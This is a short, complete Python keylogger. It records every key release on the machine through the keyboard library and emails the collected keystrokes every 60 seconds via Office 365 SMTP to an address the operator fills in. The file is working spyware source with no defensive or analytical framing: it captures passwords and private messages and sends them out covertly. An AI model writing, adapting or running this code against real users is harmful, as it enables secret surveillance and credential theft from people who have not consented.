import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 # in seconds
SOURCE_EMAIL_ADDRESS = "YOUR_SENDING_EMAIL"
EMAIL_PASSWORD = "YOUR_PASSWORD"
DEST_EMAIL_ADDRESS = "YOUR_DESTINATION_EMAIL"
PORT = "587" # for outlook 365 smtp server

class Keylogger:
    def __init__(self, interval, report_method="mail"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        
    def callback_on_release(self, event):
        key = event.name 
        if key == "space":
            key = " "
        elif key == "enter":
        # The email will be sent in html format for the mail client to interpret
            key = "<br>"
        elif key == "shift":
            key = ""
        elif key == "backspace":
            self.log = self.log[:-1]
            key = ""
        # We could handle every other case of special keys
 
        self.log += key

        
    def prepare_mail(self, message):
        
        msg = MIMEMultipart("alternative")
        msg["From"] = SOURCE_EMAIL_ADDRESS
        msg["To"] = DEST_EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()   
    
    def sendmail(self, source_email, dest_email, port, password, message):
        server = smtplib.SMTP("smtp.office365.com", port)
        server.starttls()
        server.login(source_email, password)
        server.sendmail(source_email, dest_email, self.prepare_mail(message))
        server.quit()

    def report(self):
        # Check if the user pressed something during the time interval
        if self.log:
            self.sendmail(SOURCE_EMAIL_ADDRESS, DEST_EMAIL_ADDRESS, PORT, EMAIL_PASSWORD, self.log)
            print(self.log)
        self.log = ""
        # Timer class is used to execute passed function in a new thread each interval time
        timer = Timer(interval=self.interval, function=self.report)
        # Setting the daemon as True means this thread dies when the main one does
        timer.daemon = True
        # Start the thread
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback_on_release)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ ==  "__main__":
    keylogger = Keylogger(SEND_REPORT_EVERY, report_method="mail")
    keylogger.start()